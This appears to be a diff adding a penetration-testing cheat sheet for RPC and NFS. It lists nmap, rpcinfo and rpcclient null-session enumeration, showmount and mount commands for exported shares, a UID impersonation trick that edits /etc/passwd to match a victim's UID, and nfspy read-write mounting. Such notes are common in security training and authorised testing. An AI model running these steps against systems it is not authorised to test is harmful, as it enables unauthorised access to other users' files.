@@ -1,0 +1,38 @@
+# RPC Enumeration
+
+nmap -sV -p 111 --script=rpcinfo <target>
+nmap -sV -p 111 --script=rpcinfo <target>/24
+rpcinfo -p <target>
+rpcclient -U "" -N <target>
+
+# NFS Enumeration
+
+nmap -p 111 --script nfs* <target>
+nmap -p 111 --script=nfs-ls,nfs-showmount,nfs-statfs <target>
+showmount -e <target>
+showmount -a <target>
+showmount -d <target>
+
+# NFS Mounting
+
+mkdir /mnt/nfs
+sudo mount -t nfs <target>:/share /mnt/nfs
+sudo mount -o nolock <target>:/share /mnt/nfs
+sudo mount -o nolock,vers=2 <target>:/share /mnt/nfs
+sudo mount -o nolock,vers=3 <target>:/share /mnt/nfs
+sudo mount -o nolock,vers=4 <target>:/share /mnt/nfs
+
+# UID/GID Manipulation
+
+sudo adduser pwn
+sudo sed -i -e 's/1001/<target_uid>/g' /etc/passwd
+su pwn
+id
+
+# nfspy
+
+nfspy -o server=<target>:/share,nfsport=2049,rw /mnt/nfs
+
+# Unmount
+
+sudo umount /mnt/nfs
